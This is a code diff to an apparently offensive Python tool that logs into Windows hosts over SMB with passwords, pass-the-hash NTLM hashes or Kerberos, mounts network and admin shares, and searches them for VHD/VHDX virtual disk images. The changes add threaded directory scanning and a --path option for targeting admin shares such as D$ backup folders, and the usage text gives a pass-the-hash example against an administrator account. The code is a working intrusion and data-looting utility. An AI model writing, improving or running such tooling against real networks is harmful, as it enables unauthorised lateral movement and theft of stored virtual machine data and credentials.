@@ -9,6 +9,7 @@ import sys
 import tempfile
 import time
 from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 BANNER = r"""
  ██▒   █▓ ██░ ██ ▓█████▄     ██▒   █▓ ▒█████   ███▄ ▄███▓ ██▓▄▄▄█████▓
@@ -190,20 +191,66 @@ def get_file_size_gb(path):
     except:
         return "??GB"
 
-def find_vhdx_files(paths):
+def scan_directory_for_vhdx(directory):
+    found = []
+    try:
+        print(f"  [*] Starting scan of {directory}...")
+        
+        dir_count = 0
+        file_count = 0
+        
+        for root, dirs, files in os.walk(directory):
+            dir_count += 1
+            if dir_count % 100 == 0:
+                print(f"    [*] Scanned {dir_count} directories, {file_count} files checked...")
+            
+            for filename in files:
+                file_count += 1
+                if filename.lower().endswith(('.vhdx', '.vhd')):
+                    filepath = os.path.join(root, filename)
+                    try:
+                        size = get_file_size_gb(filepath)
+                        found.append((filepath, size))
+                        print(f"    [+] FOUND: {filename} ({size})")
+                    except Exception as e:
+                        print(f"    [!] Error reading {filename}: {e}")
+        
+        print(f"  [*] Completed scan of {directory}: {dir_count} dirs, {file_count} files checked")
+                    
+    except Exception as e:
+        print(f"  [!] Error scanning {directory}: {e}")
+    
+    return found
+
+def find_vhdx_files(paths, max_workers=10):
+    print(f"[*] Scanning for VHD/VHDX files...")
+    
     vhdx_files = []
+    all_dirs = []
+    
     for path in paths:
         p = Path(path)
         if not p.exists():
             continue
+        all_dirs.append(p)
+    
+    print(f"[*] Scanning {len(all_dirs)} directories with {max_workers} threads...")
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {executor.submit(scan_directory_for_vhdx, d): d for d in all_dirs}
         
-        print(f"[*] Scanning {p} for VHD/VHDX files...")
-        for ext in ('*.vhdx', '*.vhd'):
-            for vhdx in p.rglob(ext):
-                if vhdx.is_file():
-                    vhdx_files.append(str(vhdx))
-                    size = get_file_size_gb(vhdx)
-                    print(f"  [+] Found: {vhdx.name} ({size})")
+        completed = 0
+        for future in as_completed(futures):
+            completed += 1
+            try:
+                results = future.result()
+                print(f"[*] Thread {completed}/{len(futures)} completed")
+                for vhdx_path, size in results:
+                    vhdx_files.append(vhdx_path)
+            except Exception as e:
+                print(f"[!] Thread error: {e}")
+    
+    print(f"[*] Scan complete. Found {len(vhdx_files)} VHD/VHDX files total")
     
     return vhdx_files
 
@@ -493,8 +540,8 @@ Examples:
   Pass-the-hash:
     %(prog)s -t 192.168.1.10 -u administrator -H e19ccf75ee54e06b06a5907af13cef42 -d CORP
   
-  Kerberos:
-    %(prog)s -t dc01.corp.local -u administrator -d CORP -k
+  Specific path:
+    %(prog)s -t 192.168.1.10 -u admin -p pass --path "D$/Backups/VMs"
         '''
     )
     parser.add_argument('-t', '--target', required=True, help='Target host IP or hostname')
@@ -503,15 +550,17 @@ Examples:
     parser.add_argument('-d', '--domain', default='', help='Domain name')
     parser.add_argument('-H', '--hash', default='', help='NTLM hash (format: [LM:]NT)')
     parser.add_argument('-k', '--kerberos', action='store_true', help='Use Kerberos authentication')
+    parser.add_argument('--path', default='', help='Specific path to scan (e.g., "D$/Backups/VMs")')
     
     args = parser.parse_args()
     
+    host = args.target
     user = args.username
     password = args.password
     domain = args.domain
-    host = args.target
     nthash = args.hash
     use_kerberos = args.kerberos
+    specific_path = args.path
     
     if nthash and ':' in nthash:
         nthash = nthash.split(':')[1]
@@ -537,7 +586,24 @@ Examples:
     if not shares:
         die("No accessible shares found")
     
-    selected = select_shares(shares)
+    if specific_path:
+        parts = specific_path.replace('/', '\\').split('\\', 1)
+        share_name_raw = parts[0]
+        share_name = share_name_raw.replace('$', '')
+        subpath = parts[1] if len(parts) > 1 else ''
+        
+        share_with_dollar = share_name + '$'
+        
+        available_share_names = [s[0] for s in shares]
+        
+        if share_with_dollar not in available_share_names and share_name not in available_share_names:
+            die(f"Specified share '{share_name}' not found in available shares")
+        
+        selected = [share_with_dollar if share_with_dollar in available_share_names else share_name]
+        print(f"[*] Using specified path: {share_name}\\{subpath}")
+    else:
+        selected = select_shares(shares)
+    
     creds = create_cifs_creds(domain, user, password, nthash)
     
     mounted_shares = []
@@ -551,7 +617,17 @@ Examples:
         if not mounted_shares:
             die("No shares mounted successfully")
         
-        vhdx_files = find_vhdx_files(mounted_shares)
+        if specific_path:
+            parts = specific_path.replace('\\', '/').split('/', 1)
+            if len(parts) > 1:
+                subpath = parts[1]
+                scan_paths = [str(Path(mounted_shares[0]) / subpath)]
+            else:
+                scan_paths = mounted_shares
+        else:
+            scan_paths = mounted_shares
+        
+        vhdx_files = find_vhdx_files(scan_paths, max_workers=10)
         
         if not vhdx_files:
             print("[!] No VHD/VHDX files found")
